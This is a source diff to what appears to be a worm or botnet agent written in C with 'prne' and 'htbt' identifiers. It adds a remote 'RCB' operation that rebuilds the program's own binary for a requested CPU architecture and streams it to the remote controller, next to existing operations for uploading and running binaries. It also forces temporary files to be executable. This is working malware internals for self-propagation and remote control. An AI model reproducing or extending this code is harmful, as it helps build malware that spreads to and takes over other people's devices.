@@ -75,6 +75,7 @@ typedef struct {
 	void (*lm_release_f)(void *ioctx, const htbt_lmk_t v);
 	const prne_htbt_cbset_t *cbset;
 	void *cb_ctx;
+	const prne_rcb_param_t *rcb;
 	size_t skip;
 	prne_iobuf_t iobuf[2];
 	prne_pth_cv_t cv;
@@ -1162,7 +1163,6 @@ static bool htbt_slv_srv_bin (
 	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
 	int32_t ret_errno = 0;
 	htbt_lmk_t lmk = HTBT_LMK_NONE;
-	mode_t tmpfm;
 
 	prne_dbgast(
 		mh->op == PRNE_HTBT_OP_RUN_BIN ||
@@ -1208,12 +1208,7 @@ static bool htbt_slv_srv_bin (
 	}
 
 	errno = 0;
-	switch (mh->op) {
-	case PRNE_HTBT_OP_RUN_BIN:
-	case PRNE_HTBT_OP_UP_BIN: tmpfm = 0700; break;
-	default: tmpfm = 0600;
-	}
-	path = ctx->cbset->tmpfile(ctx->cb_ctx, bin_meta.bin_size, tmpfm);
+	path = ctx->cbset->tmpfile(ctx->cb_ctx, bin_meta.bin_size, 0700);
 	if (path == NULL) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -1410,6 +1405,212 @@ END:
 	return ret;
 }
 
+static void htbt_slv_set_pack_err (
+	prne_pack_rc_t prc,
+	const int ierr,
+	prne_htbt_status_code_t *ost,
+	int32_t *oerr)
+{
+	switch (prc) {
+	case PRNE_PACK_RC_OK:
+	case PRNE_PACK_RC_EOF:
+	case PRNE_PACK_RC_INVAL:
+	case PRNE_PACK_RC_FMT_ERR:
+	case PRNE_PACK_RC_NO_ARCH:
+		*ost = PRNE_HTBT_STATUS_SUB;
+		*oerr = prc;
+		break;
+	case PRNE_PACK_RC_ERRNO:
+		*ost = PRNE_HTBT_STATUS_ERRNO;
+		*oerr = ierr;
+		break;
+	case PRNE_PACK_RC_Z_ERR:
+		*ost = PRNE_HTBT_STATUS_SUB;
+		*oerr = (int32_t)ierr << 8 | (int32_t)prc;
+		break;
+	default:
+		*ost = PRNE_HTBT_STATUS_UNIMPL;
+		*oerr = 0;
+	}
+}
+
+static bool htbt_slv_srv_rcb (
+	htbt_slv_ctx_t *ctx,
+	pth_event_t root_ev,
+	size_t off,
+	const prne_htbt_msg_head_t *org_mh)
+{
+	bool ret = true;
+	prne_htbt_rcb_t rcb_f;
+	prne_htbt_ser_rc_t s_ret;
+	size_t actual;
+	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_OK;
+	int32_t err = 0;
+	prne_pack_rc_t prc;
+	prne_bin_rcb_ctx_t rcb_ctx;
+	prne_iobuf_t rcb_ib;
+	pth_event_t ev = NULL;
+	prne_arch_t started_arch;
+	ssize_t io_ret;
+	int rcb_err = 0;
+	prne_htbt_stdio_t data_f;
+	prne_htbt_msg_head_t mh;
+
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_rcb(&rcb_f);
+	prne_htbt_init_stdio(&data_f);
+	prne_init_bin_rcb_ctx(&rcb_ctx);
+	prne_init_iobuf(&rcb_ib);
+// TRY
+	s_ret = prne_htbt_dser_rcb(
+		ctx->iobuf[0].m + off,
+		ctx->iobuf[0].len - off,
+		&actual,
+		&rcb_f);
+	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
+		ret = false;
+		goto END;
+	}
+	else {
+		off += actual;
+		prne_iobuf_shift(ctx->iobuf + 0, -off);
+	}
+	if (s_ret != PRNE_HTBT_SER_RC_OK) {
+		htbt_slv_raise_protoerr(ctx, org_mh->id, 0);
+		goto END;
+	}
+
+	if (ctx->rcb == NULL) {
+		status = PRNE_HTBT_STATUS_ERRNO;
+		err = ENOMEDIUM;
+		goto STATUS_END;
+	}
+	if (!(prne_alloc_iobuf(&rcb_ib, PRNE_HTBT_STDIO_LEN_MAX) ||
+		prne_alloc_iobuf(&rcb_ib, 512)))
+	{
+		status = PRNE_HTBT_STATUS_ERRNO;
+		err = errno;
+		goto STATUS_END;
+	}
+
+	if (rcb_f.arch == PRNE_ARCH_NONE) {
+		rcb_f.arch = ctx->rcb->self;
+	}
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": starting rcb self=%02X target=%02X\n",
+			(uintptr_t)ctx,
+			ctx->rcb->self,
+			rcb_f.arch);
+	}
+	prc = prne_start_bin_rcb_compat(
+		&rcb_ctx,
+		rcb_f.arch,
+		ctx->rcb->self,
+		ctx->rcb->m_self,
+		ctx->rcb->self_len,
+		ctx->rcb->exec_len,
+		ctx->rcb->m_dv,
+		ctx->rcb->dv_len,
+		ctx->rcb->ba,
+		&started_arch);
+	if (prc != PRNE_PACK_RC_OK) {
+		htbt_slv_set_pack_err(prc, errno, &status, &err);
+		goto STATUS_END;
+	}
+	if (!rcb_f.compat &&
+		rcb_f.arch != PRNE_ARCH_NONE &&
+		rcb_f.arch != started_arch)
+	{
+		htbt_slv_set_pack_err(PRNE_PACK_RC_NO_ARCH, 0, &status, &err);
+		goto STATUS_END;
+	}
+
+	mh.id = org_mh->id;
+	mh.is_rsp = true;
+	mh.op = PRNE_HTBT_OP_STDIO;
+	while (rcb_ib.len > 0 || prc != PRNE_PACK_RC_EOF) {
+		pth_event_free(ev, FALSE);
+		ev = pth_event(
+			PTH_EVENT_TIME,
+			prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
+		prne_assert(ev != NULL);
+
+		if (rcb_ib.avail > 0 && prc != PRNE_PACK_RC_EOF) {
+			io_ret = prne_bin_rcb_read(
+				&rcb_ctx,
+				rcb_ib.m + rcb_ib.len,
+				rcb_ib.avail,
+				&prc,
+				&rcb_err);
+			if (io_ret < 0) {
+				htbt_slv_set_pack_err(prc, rcb_err, &status, &err);
+				goto STATUS_END;
+			}
+			prne_iobuf_shift(&rcb_ib, io_ret);
+		}
+		if (rcb_ib.len > 0) {
+			data_f.len = rcb_ib.len;
+			htbt_slv_fab_frame(
+				ctx,
+				&mh,
+				&data_f,
+				(prne_htbt_ser_ft)prne_htbt_ser_stdio,
+				ev);
+			do {
+				io_ret = prne_op_min(ctx->iobuf[1].avail, rcb_ib.len);
+				memcpy(ctx->iobuf[1].m + ctx->iobuf[1].len, rcb_ib.m, io_ret);
+				prne_iobuf_shift(ctx->iobuf + 1, io_ret);
+				prne_iobuf_shift(&rcb_ib, -io_ret);
+
+				htbt_slv_consume_outbuf(ctx, 0, ev);
+				if (!ctx->valid) {
+					goto END;
+				}
+			} while (rcb_ib.len > 0);
+		}
+
+		pth_yield(NULL);
+	}
+
+	pth_event_free(ev, FALSE);
+	ev = pth_event(
+		PTH_EVENT_TIME,
+		prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
+	prne_assert(ev != NULL);
+
+	data_f.fin = true;
+	data_f.len = 0;
+	htbt_slv_fab_frame(
+		ctx,
+		&mh,
+		&data_f,
+		(prne_htbt_ser_ft)prne_htbt_ser_stdio,
+		ev);
+
+STATUS_END:
+	if (status != PRNE_HTBT_STATUS_OK) {
+		htbt_slv_fab_status(
+			ctx,
+			status,
+			err,
+			org_mh->id,
+			root_ev);
+		if (status == PRNE_HTBT_STATUS_OK) {
+			htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
+			ctx->valid = false;
+		}
+	}
+END:
+	prne_htbt_free_msg_head(&mh);
+	prne_free_iobuf(&rcb_ib);
+	prne_htbt_free_rcb(&rcb_f);
+	prne_htbt_free_stdio(&data_f);
+	prne_free_bin_rcb_ctx(&rcb_ctx);
+	pth_event_free(ev, FALSE);
+	return ret;
+}
+
 static void htbt_slv_skip_inbuf (htbt_slv_ctx_t *ctx) {
 	size_t consume;
 
@@ -1488,6 +1689,9 @@ static bool htbt_slv_consume_inbuf (
 			break;
 		case PRNE_HTBT_OP_HOVER:
 			ret |= htbt_slv_srv_hover(ctx, root_ev, actual, &f_head);
+			break;
+		case PRNE_HTBT_OP_RCB:
+			ret |= htbt_slv_srv_rcb(ctx, root_ev, actual, &f_head);
 			break;
 		default:
 			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
@@ -1924,6 +2128,7 @@ static void htbt_main_srv_hover (
 	c.slv.lm_acquire_f = htbt_main_slv_lm_acq_f;
 	c.slv.lm_release_f = htbt_main_slv_lm_rel_f;
 	c.slv.cbset = &ctx->param.cb_f;
+	c.slv.rcb = ctx->param.rcb;
 	c.slv.cb_ctx = ctx->param.cb_ctx;
 	c.slv.cv.lock = &ctx->lock;
 	c.slv.cv.cond = &ctx->cond;
@@ -2621,6 +2826,7 @@ static bool htbt_alloc_lbd_client (
 	c->slv.lm_acquire_f = htbt_lbd_slv_lm_acq_f;
 	c->slv.lm_release_f = htbt_lbd_slv_lm_rel_f;
 	c->slv.cbset = &parent->param.cb_f;
+	c->slv.rcb = parent->param.rcb;
 	c->slv.cb_ctx = parent->param.cb_ctx;
 	c->slv.cv.lock = &parent->lock;
 	c->slv.cv.cond = &parent->cond;
